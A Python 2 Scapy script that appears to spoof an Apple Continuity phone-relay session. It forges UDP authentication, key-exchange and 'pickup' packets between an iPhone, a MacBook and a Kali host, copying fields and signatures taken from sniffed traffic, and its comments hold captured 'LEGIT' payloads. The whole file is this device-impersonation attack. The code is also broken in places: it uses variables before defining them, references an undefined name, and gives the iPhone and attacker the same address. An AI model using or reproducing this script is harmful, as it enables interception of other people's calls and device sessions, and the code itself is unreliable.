import sys
import binascii
from scapy.all import *

iphone = "192.168.0.102"
kali = "192.168.0.102"
macbook = "192.168.0.105"
source = kali
destiny = iphone

#dport = 0
#sport = 61234
#counter = 0



print "-----Send auth package"
#0f0 0 0100082112a442f741c34a29796e4f0a9ec04a8005000441c60000 LEGIT REQUEST
#0f0 1 0100082112a442f741c34a29796e4f0a9ec04a8005000441c60000 LEGIT RESPONSE
myLoad = "0f000100082112a442f741c34a29796e4f0a9ec04a8005000441c60000"
send(IP(src=kali, dst=destiny)/UDP(sport=responseSport, dport=responseDport)/binascii.unhexlify(myLoad))

print "-----Waiting for Auth package response..."
myfilter = "udp and src %s and dst %s" % (destiny, source)
pkt = sniff(filter=myfilter, count=1)[0]
print "-----Auth packet received!"
pktLoad = binascii.hexlify(pkt.load)
print binascii.hexlify(pktLoad)




print "-----Sending key exchange package..."
#0f0 0 0100 38 2112a442f741c34a29796e4f0a9ec04a0025000400000001 0 00 6 00 2 4 3131 4132363832412d434537302d344546462d383835352d4132463142463644383543448005000452b20000 LEGIT
#0f0 1 0100 10 2112a442f741c34a29796e4f0a9ec04a0025000400000001 8 00 5 00 0 4 52b2 0000 LEGIT RESPONSE
myLoad = "0f000100382112a442f741c34a29796e4f0a9ec04a00250004000000010006002431314132363832412d434537302d344546462d383835352d4132463142463644383543448005000452b20000"
send(IP(src=kali, dst=destiny)/UDP(sport=responseSport, dport=responseDport)/binascii.unhexlify(myLoad))














#Auth
print "---Waiting for Auth package..."
myfilter = "udp and src %s and dst %s" % (macbook, kali)
pkt = sniff(filter=myfilter, count=1)[0]
responseSrcIp = pkt[IP].dst
responseDstIp = pkt[IP].src
responseSport = pkt[0].dport
responseDport = pkt[0].sport


print "---Auth package received"
pktLoad = binascii.hexlify(pkt.load)
print pktLoad
myLoad = pktLoad[:3] + '1' + pktLoad[4:]
pktToBeSent = IP(src=responseSrcIp, dst=responseDstIp)/UDP(sport=responseSport, dport=responseDport)/binascii.unhexlify(myLoad)
print "---Sending auth response"
print myLoad
#0f0 0 0100082112a442f741c34a29796e4f0a9ec04a8005000441c60000 LEGIT REQUEST
#0f0 1 0100082112a442f741c34a29796e4f0a9ec04a8005000441c60000 LEGIT RESPONSE
pkt = sr1(pktToBeSent) ##send(pktToBeSent)


print "---Key exchange package received"
pktLoad = binascii.hexlify(pkt.load)
print pktLoad
random0 = "4444"
myLoad = pktLoad[:3] + '1' + pktLoad[4:8] + '10' + pktLoad[10:58] + '8' + pktLoad[59:61] + '5' + pktLoad[62:64] + '0' + pktLoad[65:66] + random + '0000'
pktToBeSent = IP(src=responseSrcIp, dst=responseDstIp)/UDP(sport=responseSport, dport=responseDport)/binascii.unhexlify(myLoad)
print "---Send Key exchange response"
print myLoad
#0f0 0 0100 38 2112a442f741c34a29796e4f0a9ec04a0025000400000001 0 00 6 00 2 4 3131 4132363832412d434537302d344546462d383835352d4132463142463644383543448005000452b20000 LEGIT
#0f0 1 0100 10 2112a442f741c34a29796e4f0a9ec04a0025000400000001 8 00 5 00 0 4 52b2 0000 LEGIT RESPONSE
send(pktToBeSent)


print "---Waiting for the first 3 pickup packages..."
myfilter = "udp and src %s and src port %s and dst %s and dst port %s" % (macbook, pkt.sport, kali, pkt.dport)
pkt = sniff(filter=myfilter, count=3)[2] #Use the 3rd package
print "---Pickup packages received"
pktLoad = binascii.hexlify(pkt.load)
print pktLoad
signature1 = pktLoad[10:18]
signature2 = pktLoad[34:38]
signature3 = pktLoad[66:70]
signature4 = pktLoad[70:74]
random1 = "11111111"
random2 = "2222"
random3 = "33333333"
myLoad = '2004000400' + random1 + '00000000b002ffff' + random2 + '0000020405a0010303050101080a' + random3 + '0000000004020000'
pktToBeSent = IP(src=responseSrcIp, dst=responseDstIp)/UDP(sport=responseSport, dport=responseDport)/binascii.unhexlify(myLoad)
print "---Send pickup response"
print myLoad
#			    1                        2                                 3    4   
#2004000400 329a642c 00000000 b002ffff 5e1d 0000020405a0010303050101080a 38da 00a0 00000000  04020000
#2004000400 0f537940 00000000 b002ffff 9a7c 0000020405a0010303050101080a 2e83 153e 00000000  04020000
#               r1                      r2                                  r3
send(pktToBeSent)


print "---Waiting for pickup package #2..."
myfilter = "udp and src %s and src port %s and dst %s and dst port %s" % (macbook, pkt.sport, kali, pkt.dport)
pkt = sniff(filter=myfilter, count=1)[0] #Use the 3rd package
print "---Pickup package #2 received"
pktLoad = binascii.hexlify(pkt.load)
print pktLoad
signature5 = pktLoad[34:38]
signature6 = pktLoad[70:74]
random4 = "4444"
myLoad = '2004000400' + random1 + signature1 + '80101009' + random4 + '00000101080a' + random3 + signature3 + signature6 + '04020000'
pktToBeSent = IP(src=responseSrcIp, dst=responseDstIp)/UDP(sport=responseSport, dport=responseDport)/binascii.unhexlify(myLoad)
print "---Send pickup #2 response"
print myLoad
#               1       r1               5                                 3    6     r3    
#2004000400 329a642c 0f537941 b012ffff 8e90 0000020405a0010303050101080a 38da 03c7 2e83 153e 04020000 
#2004000400 0f537941 329a642d 80101009 f660 0000                0101080a 2e83 1593 38da 03c7
#               r1       1              r4                                   r3      3    6
send(pktToBeSent)


print "---Waiting for 2 pickup packages #3..."
myfilter = "udp and src %s and src port %s and dst %s and dst port %s" % (macbook, pkt.sport, kali, pkt.dport)
pkt1 = sniff(filter=myfilter, count=2)[0] #Use the 3rd package
print "---2 Pickup packages #3 received"
pktLoad = binascii.hexlify(pkt1.load)
print pktLoad
signature7 = pktLoad[34:38]
signature8 = pktLoad[70:74]
random4 = "4444"
myLoad = '2004000400' + random1 + signature1 + '80101009' + random4 + '00000101080a' + random3 + signature3 + signature6 + '04020000'
pktToBeSent1 = IP(src=responseSrcIp, dst=responseDstIp)/UDP(sport=responseSport, dport=responseDport)/binascii.unhexlify(myLoad)
print "---Send pickup #2 response"
print myLoad
#               1       r1               7                                 3    8     r3    
#2004000400 329a642d 0f537941 80101009 bde9 0000                0101080a 38da 03cb 2e83 1593
#2004000400 329a642d 0f537941 80181009 de59 0000                0101080a 38da 03cb 2e83 1593 00 30 0100013 2 000 8 4d6163204f53205800073130 2e3 1302e35000731344631363035000e4d6163426f6f6b50726f31312c33
#2004000400 0f537941 329a642d 80181009 0912 0000                0101080a 2e83 1593 38da 03c7 00 58 0100013 3 000 9 6950686f6e65204f53000539 2e3 22e310005313344313500096950686f6e65362c31000000040000040000000401000400000005020010 9f98e17cdeb94fd6ace0f940f97b8f72 030008000000000000003f LEGIT response
#2004000400 0f53799b 329a642d 80181009 281b 0000                0101080a 2e83 1593 38da 03c7 00 ca 0611 2123 040100240000000700270024 70772b138842 003c3 030384638364641                                                  2d3 3303234 2d3 44239 442d 42433634 2d3 43542433145324436443439 6163636f756e74636f6d2e6170706c652e707269766174652e616c6c6f792e70686f6e65636f6e74696e7569747934443533413432462d46364530 2d3 43736362d423445382d413441413737314139423636 94a921f23920e4ca00665a0be05b2fded6c7587b6863f3259cc8fc4fa8fa4d3b3c01555ee731be04b0aa20672b0fc6af95c9302102744d57b8a7d37d LEGIT response
#               r1       1              r4                                   r3      3    6
send(pktToBeSent1)
